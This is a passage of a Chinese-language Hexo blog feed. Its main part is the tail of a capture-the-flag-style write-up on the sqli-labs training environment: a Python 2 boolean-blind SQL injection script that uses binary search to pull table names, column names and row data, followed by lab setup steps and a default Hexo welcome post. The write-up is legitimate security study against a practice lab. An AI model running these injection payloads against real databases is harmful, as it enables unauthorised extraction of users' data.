selectTableNameLengthPayloadbehind  </div><div class="line">        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)  </div><div class="line">        print &quot;current table length:&quot; + str(tableNameLength)  </div><div class="line">        # 获取当前这个表的名字  </div><div class="line">        selectTableName = selectTable%(DBname, i)  </div><div class="line">        tableName = getName(asciiPayload, selectTableName ,tableNameLength)  </div><div class="line">        print tableName  </div><div class="line">  </div><div class="line">  </div><div class="line">    selectColumnCountPayload = &quot;&apos;and (select count(column_name) from information_schema.columns where table_schema=&apos;&quot;+ DBname +&quot;&apos; and table_name=&apos;%s&apos;)&gt;=%d #&quot;  </div><div class="line">    # print selectColumnCountPayload  </div><div class="line">    # 获取指定表的列的数量  </div><div class="line">    columnCount = getLengthOfString(selectColumnCountPayload, getTable)  </div><div class="line">    print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)  </div><div class="line">  </div><div class="line">    # 获取该表有多少行数据  </div><div class="line">    dataCountPayload = &quot;&apos;and (select count(*) from %s)&gt;=%d #&quot;  </div><div class="line">    dataCount = getLengthOfString(dataCountPayload, getTable)  </div><div class="line">    print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)  </div><div class="line">  </div><div class="line">    data = []  </div><div class="line">    # 获取指定表中的列  </div><div class="line">    for i in xrange(0,columnCount):  </div><div class="line">        # 获取该列名字长度  </div><div class="line">        selectColumnNameLengthPayload = &quot;&apos;and (select length(column_name) from information_schema.columns where table_schema=&apos;&quot;+ DBname +&quot;&apos; and table_name=&apos;%s&apos; limit &quot;+ str(i) +&quot;,1)&gt;=%d #&quot;  </div><div class="line">        # print selectColumnNameLengthPayload  </div><div class="line">        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)  </div><div class="line">        print &quot;current column length:&quot; + str(columnNameLength)  </div><div class="line">        # 获取该列的名字  </div><div class="line">        selectColumn = &quot;select column_name from information_schema.columns where table_schema=&apos;&quot;+ DBname +&quot;&apos; and table_name=&apos;%s&apos; limit %d,1&quot;  </div><div class="line">        selectColumnName = selectColumn%(getTable, i)  </div><div class="line">        # print selectColumnName  </div><div class="line">        columnName = getName(asciiPayload, selectColumnName ,columnNameLength)  </div><div class="line">        print columnName  </div><div class="line">  </div><div class="line">        tmpData = []  </div><div class="line">        tmpData.append(columnName)  </div><div class="line">        # 获取该表的数据  </div><div class="line">        for j in xrange(0,dataCount):  </div><div class="line">            columnDataLengthPayload = &quot;&apos;and (select length(&quot;+ columnName +&quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d #&quot;  </div><div class="line">            # print columnDataLengthPayload  </div><div class="line">            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)  </div><div class="line">            # print columnDataLength  </div><div class="line">            selectData = &quot;select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1&quot;  </div><div class="line">            columnData = getName(asciiPayload, selectData, columnDataLength)  </div><div class="line">            # print columnData  </div><div class="line">            tmpData.append(columnData)  </div><div class="line">      </div><div class="line">        data.append(tmpData)  </div><div class="line">  </div><div class="line">    # print data      </div><div class="line">    # 格式化输出数据  </div><div class="line">    # 输出列名  </div><div class="line">    tmp = &quot;&quot;  </div><div class="line">    for i in xrange(0,len(data)):  </div><div class="line">        tmp += data[i][0] + &quot;   &quot;  </div><div class="line">    print tmp  </div><div class="line">    # 输出具体数据  </div><div class="line">    for j in xrange(1,dataCount+1):  </div><div class="line">        tmp = &quot;&quot;  </div><div class="line">        for i in xrange(0,len(data)):  </div><div class="line">            tmp += data[i][j] + &quot;   &quot;  </div><div class="line">        print tmp  </div><div class="line">      </div><div class="line"># 获取字符串的长度            </div><div class="line">def getLengthOfString(payload, string):  </div><div class="line">    # 猜长度  </div><div class="line">    lengthLeft = 0  </div><div class="line">    lengthRigth = 0  </div><div class="line">    guess = 10  </div><div class="line">    # 确定长度上限，每次增加5  </div><div class="line">    while 1:  </div><div class="line">        # 如果长度大于guess  </div><div class="line">        if getLengthResult(payload, string, guess) == True:  </div><div class="line">            # 猜测值增加5  </div><div class="line">            guess = guess + 5     </div><div class="line">        else:  </div><div class="line">            lengthRigth = guess  </div><div class="line">            break  </div><div class="line">    # print &quot;lengthRigth: &quot; + str(lengthRigth)  </div><div class="line">    # 二分法查长度  </div><div class="line">    mid = (lengthLeft + lengthRigth) / 2  </div><div class="line">    while lengthLeft &lt; lengthRigth - 1:  </div><div class="line">        # 如果长度大于等于mid   </div><div class="line">        if getLengthResult(payload, string, mid) == True:  </div><div class="line">            # 更新长度的左边界为mid  </div><div class="line">            lengthLeft = mid  </div><div class="line">        else:   </div><div class="line">        # 否则就是长度小于mid  </div><div class="line">            # 更新长度的右边界为mid  </div><div class="line">            lengthRigth = mid  </div><div class="line">        # 更新中值  </div><div class="line">        mid = (lengthLeft + lengthRigth) / 2          </div><div class="line">        # print lengthLeft, lengthRigth  </div><div class="line">    # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid  </div><div class="line">    # 所以长度区间：大于等于 lengthLeft，小于lengthRigth  </div><div class="line">    # 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度  </div><div class="line">    # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8  </div><div class="line">    return lengthLeft  </div><div class="line">  </div><div class="line"># 获取名称  </div><div class="line">def getName(payload, string, lengthOfString):  </div><div class="line">    # 32是空格，是第一个可显示的字符，127是delete，最后一个字符  </div><div class="line">    tmp = &apos;&apos;  </div><div class="line">    for i in xrange(1,lengthOfString+1):  </div><div class="line">        left = 32   </div><div class="line">        right = 127  </div><div class="line">        mid = (left + right) / 2  </div><div class="line">        while left &lt; right - 1:  </div><div class="line">            # 如果该字符串的第i个字符的ascii码大于等于mid  </div><div class="line">            if getResult(payload, string, i, mid) == True:  </div><div class="line">                # 则更新左边界  </div><div class="line">                left = mid  </div><div class="line">                mid = (left + right) / 2  </div><div class="line">            else:  </div><div class="line">            # 否则该字符串的第i个字符的ascii码小于mid  </div><div class="line">                # 则更新右边界  </div><div class="line">                right = mid  </div><div class="line">            # 更新中值  </div><div class="line">            mid = (left + right) / 2  </div><div class="line">        tmp += chr(left)  </div><div class="line">        # print tmp  </div><div class="line">    return tmp    </div><div class="line">          </div><div class="line">  </div><div class="line">def main():  </div><div class="line">    inject()  </div><div class="line">main()</div></pre></td></tr></table></figure></p>
<h4 id="Less-10-Blind-Timed-based-Double-Quotes"><a href="#Less-10-Blind-Timed-based-Double-Quotes" class="headerlink" title="Less-10  Blind - Timed based - Double Quotes"></a>Less-10  Blind - Timed based - Double Quotes</h4><p>同上，使用双引号</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;emsp;&amp;emsp;这里的练习对象是sql-lab，是一个印度大佬完成后上传到github上的练习。所以通过&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;下载，下面是简单的安装教程。&lt;/p&gt;
&lt;h2 id=&quot;安装：&quot;&gt;&lt;a href=&quot;#安装：&quot; class=&quot;headerlink&quot; title=&quot;安装：&quot;&gt;&lt;/a&gt;安装：&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;提前装好apache+php+MySQL,推荐使用Appserv等便捷套件&lt;/p&gt;
&lt;p&gt;从&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;下载解压到/www目录下&lt;/p&gt;
&lt;p&gt;修改目录sql-lab\sql-connections下的db-creds文件中登入数据库的账号密码&lt;/p&gt;
&lt;p&gt;打开浏览器进入sql-lab，点击页面中的&lt;em&gt;Setup/reset Database for labs&lt;/em&gt;，就完成啦&lt;br&gt;
    
    </summary>
    
    
      <category term="sql" scheme="http://www.wuweinan.top/tags/sql/"/>
    
      <category term="writeup" scheme="http://www.wuweinan.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://www.wuweinan.top/2017/04/05/hello-world/"/>
    <id>http://www.wuweinan.top/2017/04/05/hello-world/</id>
    <published>2017-04-05T06:08:12.427Z</published>
    <updated>2017-04-05T06:08:12.427Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
    
    </summary>
    
    
  </entry>
  
</feed>
